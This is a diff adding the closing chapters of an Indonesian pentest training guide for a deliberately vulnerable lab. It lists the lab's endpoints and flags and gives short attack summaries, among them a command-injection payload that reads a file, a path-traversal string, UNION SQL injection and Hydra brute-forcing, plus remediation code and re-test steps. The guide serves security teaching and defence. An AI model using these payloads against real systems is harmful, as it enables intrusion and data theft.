+      <tr><td>☐</td><td>Eksploitasi 6 celah &amp; ambil tiap flag.</td></tr>
+      <tr><td>☐</td><td>Post-exploitation (orientasi + enumerasi baca saja).</td></tr>
+      <tr><td>☐</td><td>Dokumentasikan bukti; susun laporan.</td></tr>
+      <tr><td>☐</td><td>Terapkan perbaikan; uji ulang; reset lab.</td></tr>
+    </table>
+    <h3>9.4 Referensi URL-encoding yang sering dipakai</h3>
+    <table>
+      <tr><th>Karakter</th><th>Encode</th><th>Peran dalam payload</th></tr>
+      <tr><td><code>'</code> (kutip tunggal)</td><td><code>%27</code></td><td>Memecah string SQL.</td></tr>
+      <tr><td>spasi</td><td><code>%20</code></td><td>Pemisah kata di query SQL (bisa juga <code>+</code>).</td></tr>
+      <tr><td><code>&lt;</code> / <code>&gt;</code></td><td><code>%3C</code> / <code>%3E</code></td><td>Tag HTML untuk XSS.</td></tr>
+      <tr><td><code>;</code></td><td><code>%3B</code></td><td>Pemisah perintah shell (RCE).</td></tr>
+      <tr><td><code>/</code></td><td><code>%2F</code></td><td>Pemisah path (traversal).</td></tr>
+      <tr><td><code>#</code></td><td><code>%23</code></td><td>Komentar/anchor.</td></tr>
+      <tr><td><code>&amp;</code></td><td><code>%26</code></td><td>Pemisah parameter query.</td></tr>
+    </table>
+    <div class="note"><b>Tip:</b> daripada menghafal, pakai <code>--data-urlencode</code> pada curl atau fitur
+      <i>Decoder</i> di Burp agar encoding otomatis &amp; benar.</div>
+
+    <h3>9.5 Peta endpoint lab (satu tabel)</h3>
+    <table>
+      <tr><th>Metode &amp; endpoint</th><th>Auth?</th><th>Celah</th><th>Bukti</th></tr>
+      <tr><td><code>GET /api/v1/system/health</code></td><td>tidak</td><td>—</td><td>cek <code>vulnMode</code></td></tr>
+      <tr><td><code>POST /api/v1/auth/login</code></td><td>tidak</td><td>Enumerasi + brute</td><td>pesan beda; sesi</td></tr>
+      <tr><td><code>GET /api/v1/targets/search?q=</code></td><td>ya</td><td>SQL Injection</td><td><code>YO{un10n_s3l3ct_th3_0wl}</code></td></tr>
+      <tr><td><code>POST /api/v1/assessments/:id/vulnerabilities</code></td><td>ya</td><td>Stored XSS (field <code>description</code>)</td><td>judul/warna berubah</td></tr>
+      <tr><td><code>GET /api/v1/assessments/:id/export</code></td><td>ya</td><td>IDOR</td><td>FLAG_IDOR di deskripsi privat admin</td></tr>
+      <tr><td><code>GET /api/v1/files?name=</code></td><td>ya</td><td>Path traversal</td><td>FLAG_TRAVERSAL</td></tr>
+      <tr><td><code>POST /api/v1/tools/lookup</code></td><td>ya</td><td>Command injection (RCE)</td><td>FLAG_RCE</td></tr>
+      <tr><td><code>GET /api/v1/system/debug</code></td><td><b>tidak</b></td><td>Misconfiguration</td><td>FLAG_DEBUG + env</td></tr>
+    </table>
+    <div class="warn-box"><b>Catatan penting:</b> <b>tidak ada</b> endpoint <code>/api/v1/findings</code>. Vektor XSS
+      yang benar adalah <code>POST /api/v1/assessments/:id/vulnerabilities</code>. Dan semua endpoint di atas berada di
+      lab <code>72.62.120.97:8080</code>, bukan di control center.</div>
+
+    <h3>9.6 Glosarium istilah keamanan</h3>
+    <table>
+      <tr><th>Istilah</th><th>Arti</th></tr>
+      <tr><td>Payload</td><td>Input berbahaya yang dirancang memicu celah.</td></tr>
+      <tr><td>Endpoint</td><td>Satu alamat/jalur API yang menerima request.</td></tr>
+      <tr><td>Enumerasi</td><td>Mengumpulkan daftar valid (akun, path) dari respons berbeda.</td></tr>
+      <tr><td>IDOR</td><td><i>Insecure Direct Object Reference</i>: akses objek orang lain lewat id yang bisa ditebak.</td></tr>
+      <tr><td>RCE</td><td><i>Remote Code Execution</i>: menjalankan perintah di server korban.</td></tr>
+      <tr><td>XSS</td><td><i>Cross-Site Scripting</i>: menyuntik skrip yang berjalan di peramban pengguna.</td></tr>
+      <tr><td>WAF</td><td><i>Web Application Firewall</i>: penyaring request berbahaya.</td></tr>
+      <tr><td>Reverse shell</td><td>Server "menelepon balik" memberi shell ke penyerang.</td></tr>
+      <tr><td>Persistence</td><td>Cara mempertahankan akses setelah reboot.</td></tr>
+      <tr><td>False positive</td><td>Temuan scanner yang ternyata tidak nyata saat diverifikasi.</td></tr>
+      <tr><td>CVSS</td><td>Skor baku 0–10 untuk tingkat keparahan celah.</td></tr>
+    </table>
+
+    <h3>9.7 Troubleshooting: "perintah tidak jalan"</h3>
+    <p>Daftar gejala tersering beserta penyebab &amp; solusinya. Mayoritas masalah pemula ada di sini.</p>
+    <table>
+      <tr><th>Gejala / pesan</th><th>Penyebab</th><th>Solusi</th></tr>
+      <tr><td><code>UNAUTHENTICATED</code> / <code>"Please log in."</code></td><td>Belum login atau cookie tak terkirim.</td><td>Login (BAB 2.4) &amp; selalu sertakan <code>-b cookies.txt</code>.</td></tr>
+      <tr><td><code>"Body is not valid JSON"</code></td><td>Tanda kutip tunggal di dalam <code>-d '...'</code> memecah body.</td><td>Pakai payload tanpa kutip, atau <code>-d @body.json</code> (BAB 6.2 Cara B).</td></tr>
+      <tr><td><code>Route not found</code></td><td>Endpoint salah, mis. <code>/api/v1/findings</code> (tidak ada).</td><td>Pakai <code>POST /assessments/:id/vulnerabilities</code> untuk XSS.</td></tr>
+      <tr><td><code>VALIDATION_ERROR</code></td><td>Field wajib kurang (title/category/description + severity/cvss).</td><td>Lengkapi body sesuai skema (BAB 6.2).</td></tr>
+      <tr><td>SQLi balas hasil kosong, bukan error</td><td>Jumlah kolom UNION ≠ 6, atau kutip belum ditutup.</td><td>Hitung ulang dengan <code>ORDER BY</code> (BAB 6.1); pakai tepat 6 kolom.</td></tr>
+      <tr><td><code>Connection refused</code> / timeout</td><td>Salah IP/port, atau lab mati.</td><td>Cek <code>system/health</code>; pastikan <code>72.62.120.97:8080</code>.</td></tr>
+      <tr><td><code>"vulnMode": false</code></td><td>Anda menyentuh salinan aman (control center).</td><td>Berhenti; arahkan ke IP lab, bukan subdomain.</td></tr>
+      <tr><td>sqlmap <code>all tested ... not injectable</code></td><td>Cookie tak terkirim atau parameter salah.</td><td>Sertakan <code>--cookie</code> &amp; <code>-p q</code>; naikkan <code>--level</code>.</td></tr>
+      <tr><td>Hydra tak menemukan password</td><td>Penanda gagal salah (<code>No account</code>).</td><td>Pakai penanda <code>Wrong password</code> (BAB 6.6).</td></tr>
+      <tr><td>Flag RCE kosong</td><td>Path file flag salah ketik.</td><td>Gunakan <code>/tmp/youngowl-lab/.rce/flag</code> persis.</td></tr>
+    </table>
+    <div class="exp"><b>Prinsip debugging:</b> baca pesan server apa adanya — hampir selalu ia menyebut penyebabnya.
+      Uji satu perubahan setiap kali, dan simpan perintah yang berhasil ke catatan laporan Anda.</div>
+
+    <h3>9.8 Contoh ringkasan eksekutif (untuk laporan)</h3>
+    <div class="note"><i>"Penilaian keamanan terhadap instance lab Young Owl menemukan 6 celah, 2 di antaranya
+      kritis. Penyerang yang sudah masuk sebagai pengguna biasa dapat membaca seluruh basis data (termasuk hash kata
+      sandi admin) melalui SQL injection, menjalankan perintah sistem operasi di server melalui injeksi perintah, serta
+      mengakses data assessment privat pengguna lain. Sebuah endpoint debug tanpa autentikasi turut membocorkan
+      konfigurasi sensitif. Perbaikan utama — prepared statement, otorisasi tingkat objek, dan penonaktifan endpoint
+      debug — direkomendasikan dengan prioritas tinggi."</i></div>
+    <div class="exp"><b>Mengapa begini:</b> ringkasan eksekutif ditulis untuk pembaca non-teknis. Ia menyebut
+      <i>dampak</i> (data &amp; server dikuasai), bukan detail perintah. Detail teknis masuk ke bagian Temuan.</div>
+
+    <h3>9.9 Pemetaan lengkap ke OWASP Top 10 (2021)</h3>
+    <table>
+      <tr><th>Kategori</th><th>Ada di lab?</th><th>Keterangan</th></tr>
+      <tr><td>A01 Broken Access Control</td><td>Ya</td><td>IDOR export assessment.</td></tr>
+      <tr><td>A02 Cryptographic Failures</td><td>Sebagian</td><td>Debug membocorkan konfigurasi sensitif.</td></tr>
+      <tr><td>A03 Injection</td><td>Ya</td><td>SQLi, Command Injection, Stored XSS.</td></tr>
+      <tr><td>A04 Insecure Design</td><td>Ya</td><td>Login membocorkan status akun (desain pesan).</td></tr>
+      <tr><td>A05 Security Misconfiguration</td><td>Ya</td><td>Endpoint debug aktif tanpa auth.</td></tr>
+      <tr><td>A06 Vulnerable Components</td><td>Latihan</td><td>Cek versi lewat nmap/nuclei.</td></tr>
+      <tr><td>A07 Auth Failures</td><td>Ya</td><td>Enumerasi + rate limit lemah.</td></tr>
+      <tr><td>A08 Integrity Failures</td><td>—</td><td>Tidak difokuskan di lab ini.</td></tr>
+      <tr><td>A09 Logging &amp; Monitoring</td><td>Ya</td><td>Modul attack monitor (BAB 8).</td></tr>
+      <tr><td>A10 SSRF</td><td>—</td><td>Tidak ditanam di versi ini.</td></tr>
+    </table>
+
+    <h3>9.10 Belajar lanjutan</h3>
+    <ul>
+      <li><b>OWASP Top 10</b> &amp; <b>OWASP Testing Guide</b> — kerangka standar yang buku ini ikuti.</li>
+      <li><b>PortSwigger Web Security Academy</b> — latihan gratis per celah, lengkap dengan lab interaktif.</li>
+      <li><b>PTES</b> (Penetration Testing Execution Standard) — struktur metodologi &amp; pelaporan.</li>
+      <li><b>CVSS calculator</b> — untuk memberi skor keparahan temuan secara konsisten.</li>
+    </ul>
+    <div class="exp"><b>Saran langkah berikut:</b> kuasai keenam celah lab ini sampai bisa tanpa menyontek, lalu
+      ulangi di lab publik yang sengaja rentan (mis. latihan OWASP) untuk memperluas repertoar — selalu hanya pada
+      target yang memang disediakan untuk dilatih.</div>
+
+    <h3>9.10b Referensi port &amp; layanan umum</h3>
+    <table>
+      <tr><th>Port</th><th>Layanan</th><th>Catatan</th></tr>
+      <tr><td>80 / 443</td><td>HTTP / HTTPS</td><td>Web standar.</td></tr>
+      <tr><td><b>8080</b></td><td>HTTP alternatif</td><td><b>Port lab Young Owl.</b></td></tr>
+      <tr><td>22</td><td>SSH</td><td>Akses shell (bukan vektor lab).</td></tr>
+      <tr><td>5432</td><td>PostgreSQL</td><td>DB lab — sengaja tertutup dari luar.</td></tr>
+      <tr><td>6379</td><td>Redis</td><td>Cache — juga tertutup.</td></tr>
+      <tr><td>3000 / 5173</td><td>Dev server</td><td>Umum untuk front-end saat pengembangan.</td></tr>
+    </table>
+    <div class="note"><b>Penting:</b> Nmap (BAB 3.5) hanya menemukan port yang <i>terbuka</i>. Lab sengaja hanya
+      membuka 8080; DB &amp; Redis tertutup — itu desain pertahanan yang benar.</div>
+
+    <h3>9.11 Template laporan kosong (isi sendiri)</h3>
+    <p>Salin kerangka ini ke dokumen Anda dan isi tiap kurung siku. Satu blok "Temuan" per celah.</p>
+    <pre><code>LAPORAN PENETRATION TESTING — YOUNG OWL LAB
+Tanggal: [__]   Penguji: [__]   Scope: http://72.62.120.97:8080
+
+1. RINGKASAN EKSEKUTIF
+   [2-4 kalimat: jumlah temuan, yang paling kritis, dampak bisnis, rekomendasi utama]
+
+2. LINGKUP &amp; METODOLOGI
+   - Target: [__]   Di luar scope: control center &amp; host lain
+   - Metode: recon -> scanning -> exploitation -> post-exploitation -> pelaporan
+   - Jendela waktu: [__]
+
+3. TEMUAN
+   3.1 [Judul celah]
+       - Keparahan: [Critical/High/Medium/Low]  (CVSS: [__])
+       - Lokasi: [metode + endpoint]
+       - Deskripsi: [apa &amp; mengapa rentan]
+       - Langkah reproduksi: [perintah persis]
+       - Bukti: [respons / flag]
+       - Dampak: [apa yang bisa dilakukan penyerang]
+       - Rekomendasi: [perbaikan konkret -> lihat BAB 10]
+   3.2 [...]
+
+4. RINGKASAN REKOMENDASI (prioritas)
+   [tabel: celah -> perbaikan -> prioritas]
+
+5. LAMPIRAN
+   [output mentah, timeline, screenshot]</code></pre>
+    <div class="exp"><b>Penjelasan:</b> karena selama BAB 3–8 Anda sudah menyimpan tiap perintah &amp; respons, mengisi
+      template ini tinggal menempelkan catatan Anda. Inilah mengapa disiplin "simpan buktinya" ditekankan sejak awal —
+      laporan jadi hampir menulis dirinya sendiri.</div>
+
+    <div class="warn-box"><b>Penutup.</b> Anda kini punya alur lengkap dari recon sampai post-exploitation untuk lab
+      sendiri, dengan tiap perintah dijelaskan. Gunakan hanya di <code>http://72.62.120.97:8080</code>. Keahlian ini
+      bernilai justru karena dipakai untuk <b>memperbaiki</b>, bukan merusak.</div>
+
+    <!-- BAB 10 -->
+    <h2 class="chapter"><span class="n">BAB 10</span>Panduan Perbaikan (Remediation) dengan contoh kode</h2>
+    <p class="lead">Tujuan akhir pentest adalah perbaikan. Bab ini menunjukkan, per celah, <b>mengapa</b> kode lab rentan
+      dan <b>bagaimana</b> menutupnya — dengan contoh sebelum/sesudah bergaya stack Young Owl (Fastify + Prisma +
+      TypeScript). Pola ini universal untuk aplikasi web mana pun.</p>
+
+    <h3>10.1 SQL Injection → prepared statement / query parameter</h3>
+    <h4>Sebelum (rentan)</h4>
+    <pre><code>const sql = `SELECT id, name, ... FROM targets
+  WHERE name ILIKE '%${q}%' OR hostname ILIKE '%${q}%'`;
+const rows = await prisma.$queryRawUnsafe(sql);   <span class="c">// input disambung langsung</span></code></pre>
+    <h4>Sesudah (aman)</h4>
+    <pre><code>const term = `%${q}%`;
+const rows = await prisma.$queryRaw`
+  SELECT id, name, hostname FROM targets
+  WHERE name ILIKE ${term} OR hostname ILIKE ${term}`;   <span class="c">// nilai dikirim terpisah</span>
+<span class="c">// atau pakai API Prisma yang sudah aman:</span>
+const rows2 = await prisma.target.findMany({
+  where: { OR: [{ name: { contains: q } }, { hostname: { contains: q } }] },
+});</code></pre>
+    <div class="exp"><b>Mengapa aman:</b> dengan <code>$queryRaw</code> (tagged template) atau API <code>findMany</code>,
+      nilai <code>q</code> dikirim ke database sebagai <i>parameter terpisah</i>, bukan sebagai bagian dari teks SQL.
+      Database memperlakukannya sebagai data murni, sehingga <code>UNION SELECT</code> dkk. tak pernah dieksekusi.</div>
+    <div class="detect"><b>Kebersihan tambahan:</b> jangan kembalikan pesan/stack error DB ke klien (tangani &amp; log
+      di server); beri akun DB hak paling minimal (tak perlu akses ke tabel flag dari query pencarian).</div>
+
+    <h3>10.2 Stored XSS → encode output + Content-Security-Policy</h3>
+    <h4>Sebelum (rentan)</h4>
+    <pre><code>element.innerHTML = vuln.description;   <span class="c">// HTML mentah dirender &amp; dieksekusi</span></code></pre>
+    <h4>Sesudah (aman)</h4>
+    <pre><code>element.textContent = vuln.description;  <span class="c">// diperlakukan sebagai teks, bukan HTML</span>
+<span class="c">// bila HTML memang perlu, sanitasi dulu:</span>
+import DOMPurify from 'dompurify';
+element.innerHTML = DOMPurify.sanitize(vuln.description);</code></pre>
+    <pre><code><span class="c">// header respons (mis. via @fastify/helmet):</span>
+Content-Security-Policy: default-src 'self'; script-src 'self'
+X-Content-Type-Options: nosniff</code></pre>
+    <div class="exp"><b>Mengapa aman:</b> <code>textContent</code> menampilkan teks apa adanya sehingga
+      <code>&lt;img onerror&gt;</code> tidak pernah menjadi elemen hidup. CSP menjadi jaring pengaman kedua: meski ada
+      skrip nyelip, peramban menolak menjalankan skrip dari sumber tak sah. Set cookie sesi <code>HttpOnly</code> agar
+      JS tak bisa mencuri cookie.</div>
+
+    <h3>10.3 IDOR → cek otorisasi tingkat objek</h3>
+    <h4>Sebelum (rentan)</h4>
+    <pre><code>const a = await prisma.assessment.findUnique({ where: { id } });
+return a;   <span class="c">// siapa pun yang login bisa ambil assessment mana pun</span></code></pre>
+    <h4>Sesudah (aman)</h4>
+    <pre><code>const a = await prisma.assessment.findUnique({ where: { id } });
+if (!a) throw new AppError(404, 'NOT_FOUND', 'Assessment not found.');
+if (a.ownerId !== req.user.id &amp;&amp; req.user.role !== 'ADMIN') {
+  throw new AppError(403, 'FORBIDDEN', 'Not your assessment.');   <span class="c">// cek pemilik</span>
+}
+return a;</code></pre>
+    <div class="exp"><b>Mengapa aman:</b> setiap akses objek diverifikasi terhadap pemilik/peran pengguna yang sedang
+      login. Memakai id acak (UUID) menyulitkan tebakan, tetapi <b>bukan</b> pengganti pemeriksaan otorisasi ini —
+      kontrol akses harus di sisi server, selalu.</div>
+
+    <h3>10.4 Command Injection → tanpa shell + whitelist</h3>
+    <h4>Sebelum (rentan)</h4>
+    <pre><code>exec(`getent hosts ${host}`);   <span class="c">// host masuk ke shell → ";" menyambung perintah</span></code></pre>
+    <h4>Sesudah (aman)</h4>
+    <pre><code>import { execFile } from 'node:child_process';
+import dns from 'node:dns/promises';
+
+<span class="c">// opsi terbaik: pakai resolver bawaan, tanpa shell sama sekali</span>
+const addrs = await dns.lookup(host, { all: true });
+
+<span class="c">// bila tetap perlu program eksternal: execFile (argumen terpisah, tanpa shell)</span>
+if (!/^[a-zA-Z0-9.-]+$/.test(host)) throw new AppError(400, 'BAD_INPUT', 'Invalid host');
+execFile('getent', ['hosts', host]);   <span class="c">// ";" kini hanya jadi karakter biasa</span></code></pre>
+    <div class="exp"><b>Mengapa aman:</b> <code>dns.lookup</code> tak menyentuh shell sama sekali. Bila program eksternal
+      wajib, <code>execFile</code> mengirim argumen sebagai array terpisah sehingga <code>;</code>/<code>|</code> tidak
+      ditafsirkan sebagai operator shell. Validasi whitelist karakter menolak input aneh lebih awal.</div>
+
+    <h3>10.5 Path Traversal → normalisasi &amp; kurungan folder</h3>
+    <h4>Sebelum (rentan)</h4>
+    <pre><code>const cleaned = name.replace('../', '');   <span class="c">// hanya sekali → "....//" lolos</span>
+readFileSync(join(FILES_DIR, cleaned));</code></pre>
+    <h4>Sesudah (aman)</h4>
+    <pre><code>import path from 'node:path';
+const target = path.resolve(FILES_DIR, name);
+if (!target.startsWith(FILES_DIR + path.sep)) {
+  throw new AppError(400, 'BAD_PATH', 'Path escapes allowed folder');   <span class="c">// kurungan</span>
+}
+readFileSync(target);</code></pre>
+    <div class="exp"><b>Mengapa aman:</b> alih-alih mencoba "membersihkan" string (selalu bisa di-bypass),
+      <code>path.resolve</code> menghitung path final yang sebenarnya, lalu kita <b>pastikan</b> ia masih di dalam
+      <code>FILES_DIR</code>. Apa pun bentuk <code>../</code>/<code>....//</code>, jika hasilnya keluar folder, ditolak.</div>
+
+    <h3>10.6 Debug endpoint &amp; enumerasi login</h3>
+    <pre><code><span class="c">// debug: matikan di produksi &amp; jangan pernah bocorkan env</span>
+if (config.NODE_ENV !== 'development') return reply.status(404).send();
+
+<span class="c">// login: samakan pesan &amp; aktifkan rate limit + lockout</span>
+if (!user || !valid) throw new AppError(401, 'AUTH', 'Email atau password salah.');
+<span class="c">// @fastify/rate-limit: mis. 5 percобаan / menit / IP, lalu lockout sementara</span></code></pre>
+    <div class="exp"><b>Mengapa aman:</b> pesan login yang seragam menghilangkan sinyal enumerasi (penyerang tak tahu
+      email mana yang valid). Rate limit &amp; lockout membuat brute force tak praktis. Endpoint debug tak boleh ada di
+      produksi, dan tak pernah mengembalikan secret.</div>
+
+    <h3>10.7 Ringkasan prioritas perbaikan</h3>
+    <table>
+      <tr><th>Prioritas</th><th>Celah</th><th>Perbaikan inti</th></tr>
+      <tr><td>Kritis</td><td>SQLi</td><td>Prepared statement / Prisma API; sembunyikan error DB.</td></tr>
+      <tr><td>Kritis</td><td>RCE</td><td>Tanpa shell (<code>dns.lookup</code>/<code>execFile</code>) + whitelist.</td></tr>
+      <tr><td>Tinggi</td><td>IDOR</td><td>Cek pemilik/peran tiap akses objek.</td></tr>
+      <tr><td>Tinggi</td><td>Stored XSS</td><td><code>textContent</code>/sanitasi + CSP + cookie HttpOnly.</td></tr>
+      <tr><td>Sedang</td><td>Path traversal</td><td><code>path.resolve</code> + kurungan folder.</td></tr>
+      <tr><td>Sedang</td><td>Misconfig/enum</td><td>Matikan debug; pesan seragam; rate limit.</td></tr>
+    </table>
+    <div class="exp"><b>Terakhir:</b> setelah menerapkan perbaikan, jalankan ulang perintah serangan dari BAB 6. Celah
+      dianggap benar-benar tertutup hanya jika serangan yang dulu berhasil kini gagal. Itulah lingkaran penuh seorang
+      pentester: serang → buktikan → perbaiki → uji ulang.</div>
+
+    <h3>10.8 Playbook verifikasi pasca-perbaikan (re-test)</h3>
+    <p>Jalankan tiap perintah berikut setelah menerapkan perbaikan. Kolom "lulus" menjelaskan bagaimana respons
+      seharusnya berubah bila perbaikan benar.</p>
+    <table>
+      <tr><th>Uji ulang</th><th>Lulus bila…</th></tr>
+      <tr><td>SQLi UNION (BAB 6.1)</td><td>Tak ada flag/hasil bocor; tak ada error DB; query diperlakukan sebagai teks pencarian biasa.</td></tr>
+      <tr><td>XSS (BAB 6.2)</td><td>Deskripsi muncul sebagai <i>teks</i>; judul/warna tak berubah; CSP memblokir skrip.</td></tr>
+      <tr><td>IDOR (BAB 6.3)</td><td>Akses id milik orang lain membalas <code>403 FORBIDDEN</code>.</td></tr>
+      <tr><td>Traversal (BAB 6.4a)</td><td><code>....//secret/flag.txt</code> membalas <code>400</code>/<code>404</code>, bukan isi berkas.</td></tr>
+      <tr><td>RCE (BAB 6.4b)</td><td><code>x; id</code> tidak menjalankan <code>id</code>; <code>;</code> jadi karakter biasa.</td></tr>
+      <tr><td>Debug (BAB 6.5)</td><td><code>/system/debug</code> membalas <code>404</code> di produksi.</td></tr>
+      <tr><td>Brute (BAB 6.6)</td><td>Pesan login seragam; rate limit memblokir setelah beberapa percobaan.</td></tr>
+    </table>
+    <div class="exp"><b>Penjelasan:</b> re-test mengubah laporan dari "daftar masalah" menjadi "bukti perbaikan".
+      Lampirkan perintah + respons baru sebagai bukti bahwa tiap celah benar-benar tertutup.</div>
+
+    <h3>10.9 Checklist "secure by default"</h3>
+    <table>
+      <tr><th>✔</th><th>Praktik yang mencegah seluruh kelas celah di buku ini</th></tr>
+      <tr><td>☐</td><td>Selalu query berparameter (ORM/prepared statement), tak pernah menyambung string SQL.</td></tr>
+      <tr><td>☐</td><td>Encode/sanitasi semua output; terapkan Content-Security-Policy.</td></tr>
+      <tr><td>☐</td><td>Cek otorisasi tingkat objek pada <i>setiap</i> endpoint yang mengambil data milik pengguna.</td></tr>
+      <tr><td>☐</td><td>Jangan pernah serahkan input ke shell; pakai API bawaan atau <code>execFile</code> + whitelist.</td></tr>
+      <tr><td>☐</td><td>Normalisasi path &amp; pastikan tetap di dalam folder yang diizinkan.</td></tr>
+      <tr><td>☐</td><td>Validasi semua input di server (skema), bukan hanya di klien.</td></tr>
+      <tr><td>☐</td><td>Pesan error seragam; jangan bocorkan stack/konfigurasi.</td></tr>
+      <tr><td>☐</td><td>Rate limit + lockout + MFA untuk autentikasi.</td></tr>
+      <tr><td>☐</td><td>Cookie sesi <code>HttpOnly</code> + <code>Secure</code>; set header keamanan via helmet.</td></tr>
+      <tr><td>☐</td><td>Matikan endpoint debug &amp; mode verbose di produksi.</td></tr>
+      <tr><td>☐</td><td>Hak akun database minimal; isolasi jaringan; blokir egress yang tak perlu.</td></tr>
+      <tr><td>☐</td><td>Logging &amp; monitoring aktif (korelasikan dengan pola serangan di BAB 8).</td></tr>
+    </table>
+    <div class="exp"><b>Pesan penutup:</b> menyerang mengajari Anda cara bertahan. Setiap flag yang Anda tangkap di lab
+      ini mewakili satu kebiasaan aman yang kini Anda pahami dari dalam. Gunakan pengetahuan ini untuk membuat Young Owl
+      — dan aplikasi apa pun yang Anda bangun — lebih sulit ditembus.</div>
+
+    <h3>10.10 Kartu ringkas per celah (satu tempat)</h3>
+    <p>Gunakan ini sebagai rujukan cepat saat berlatih — ringkasan "serang lalu perbaiki" tiap celah.</p>
+
+    <h4>SQL Injection</h4>
+    <div class="note"><b>Serang:</b> <code>GET /targets/search?q=</code> + UNION 6 kolom dari <code>lab_flags</code>/<code>users</code>.
+      <b>Perbaiki:</b> prepared statement / Prisma API; sembunyikan error DB; hak DB minimal.
+      <b>Lulus re-test:</b> input jadi teks pencarian biasa, tak ada data bocor.</div>
+
+    <h4>Stored XSS</h4>
+    <div class="note"><b>Serang:</b> <code>POST /assessments/:id/vulnerabilities</code>, field <code>description</code> +
+      payload tanpa kutip. <b>Perbaiki:</b> <code>textContent</code>/sanitasi + CSP + cookie HttpOnly.
+      <b>Lulus re-test:</b> payload tampil sebagai teks.</div>
+
+    <h4>IDOR</h4>
+    <div class="note"><b>Serang:</b> <code>GET /assessments/:id/export</code>, telusuri id. <b>Perbaiki:</b> cek
+      pemilik/peran tiap akses. <b>Lulus re-test:</b> id milik orang lain → <code>403</code>.</div>
+
+    <h4>Path Traversal</h4>
+    <div class="note"><b>Serang:</b> <code>GET /files?name=....//secret/flag.txt</code>. <b>Perbaiki:</b>
+      <code>path.resolve</code> + kurungan folder. <b>Lulus re-test:</b> → <code>400/404</code>, bukan isi berkas.</div>
+
+    <h4>Command Injection (RCE)</h4>
+    <div class="note"><b>Serang:</b> <code>POST /tools/lookup</code>, <code>{"host":"x; cat /tmp/youngowl-lab/.rce/flag"}</code>.
+      <b>Perbaiki:</b> tanpa shell (<code>dns.lookup</code>/<code>execFile</code>) + whitelist. <b>Lulus re-test:</b>
+      <code>;</code> tak menyambung perintah.</div>
+
+    <h4>Security Misconfiguration (debug)</h4>
+    <div class="note"><b>Serang:</b> <code>GET /system/debug</code> tanpa login → env + flag. <b>Perbaiki:</b> matikan di
+      produksi; jangan kembalikan secret. <b>Lulus re-test:</b> → <code>404</code> di produksi.</div>
+
+    <h4>Auth: enumerasi &amp; brute</h4>
+    <div class="note"><b>Serang:</b> bandingkan pesan login; Hydra terhadap <code>intern</code> (penanda
+      <code>Wrong password</code>). <b>Perbaiki:</b> pesan seragam + rate limit + lockout + MFA. <b>Lulus re-test:</b>
+      pesan sama &amp; brute terblokir.</div>
+
+    <h3>10.11 Urutan latihan yang disarankan</h3>
+    <p>Bila ini pertama kalinya, ikuti urutan ini agar tiap langkah membangun yang sebelumnya:</p>
+    <ol>
+      <li><b>Hari 1 — fondasi:</b> baca BAB 1–2, login, verifikasi <code>vulnMode</code>, pahami anatomi curl &amp; jq.</li>
+      <li><b>Hari 2 — recon:</b> kerjakan BAB 3 end-to-end, susun peta endpoint &amp; parameter Anda sendiri.</li>
+      <li><b>Hari 3 — scanning:</b> jalankan BAB 4, verifikasi tiap temuan scanner secara manual.</li>
+      <li><b>Hari 4 — eksploitasi mudah:</b> BAB 6.5 (debug), 6.1 (SQLi), 6.4a (traversal) — tangkap 3 flag.</li>
+      <li><b>Hari 5 — eksploitasi lanjut:</b> BAB 6.2 (XSS), 6.3 (IDOR), 6.4b (RCE), 6.6 (brute).</li>
+      <li><b>Hari 6 — post &amp; lapor:</b> BAB 7–8, isi template laporan (9.11).</li>
+      <li><b>Hari 7 — perbaiki:</b> terapkan BAB 10, lalu re-test (10.8) sampai semua serangan gagal.</li>
+    </ol>
+    <div class="exp"><b>Target akhir:</b> Anda bisa menangkap keenam flag tanpa menyontek, menjelaskan tiap perintah
+      dengan kata-kata sendiri, dan menutup tiap celah di kode. Saat itu tercapai, Anda tidak lagi sekadar "mengikuti
+      tutorial" — Anda sudah berpikir seperti penyerang sekaligus pembela.</div>
+
+    <div class="foot">Young Owl — Panduan Membobol Lab Sendiri · Gunakan hanya pada lab milik Anda · 2026</div>
+  </body>
+</html>
